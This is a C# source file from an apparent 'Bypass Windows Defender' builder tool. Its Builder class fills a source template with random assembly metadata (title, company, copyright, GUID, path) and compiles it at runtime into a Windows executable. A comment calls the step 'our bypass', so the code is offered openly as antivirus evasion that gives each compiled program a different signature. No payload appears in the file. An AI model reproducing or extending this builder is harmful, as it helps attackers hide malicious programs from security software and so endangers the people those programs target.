using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Bypass_Windows_Defender
{
    public class Builder
    {
        private Random random = new Random();
        private string RandomString(int length)
        {
            char[] rndString = new char[length];
            string alphabet = "abcdefghiklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            for (int i = 0; i < length; i++)
            {
                rndString[i] = alphabet[random.Next(alphabet.Length)];
            }
            return new string(rndString);
        }

        private string PrepareSource(string source)
        {
            source = source.Replace("%TITLE%", RandomString(8));
            source = source.Replace("%DESCRIPTION%", RandomString(8));
            source = source.Replace("%COMPANY%", RandomString(8));
            source = source.Replace("%PRODUCT%", RandomString(8));
            source = source.Replace("%COPYRIGHT%", RandomString(8));
            source = source.Replace("%TRADEMARK%", RandomString(8));
            source = source.Replace("%GUID%", Guid.NewGuid().ToString());

            source = source.Replace("%RNDPATH%", RandomString(8));

            return source;
        }

        public Builder(string source, string output)
        {
            source = PrepareSource(source); // Prepare our bypass by changing some info

            // references
            string[] assemblies = new string[] {  
                "System.dll",
                "System.Windows.Forms.dll",
            };

            // .net framework version
            Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

            // compiler settings
            // set it to be a windows executable file
            // set platform to work for 32 and 64bit
            // optimizes source code
            string compilerSettings = "/t:winexe /platform:anycpu /optimize+";

            using(CSharpCodeProvider cSharpCode = new CSharpCodeProvider(providerOptions))
            {
                CompilerParameters compilerParameters = new CompilerParameters(assemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    OutputAssembly = output,
                    CompilerOptions = compilerSettings,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };

                CompilerResults results = cSharpCode.CompileAssemblyFromSource(compilerParameters, source); // compile the source that we specified
                if(results.Errors.Count > 0)
                {
                    foreach(CompilerError err in results.Errors)
                    {
                        MessageBox.Show(string.Format("{0} - in Line: {1}", err.ErrorText, err.Line));
                    }
                    return;
                }
                else { MessageBox.Show(String.Format("Compiled! You can find the file in {0}", output)); }
            }
        }





    }
}
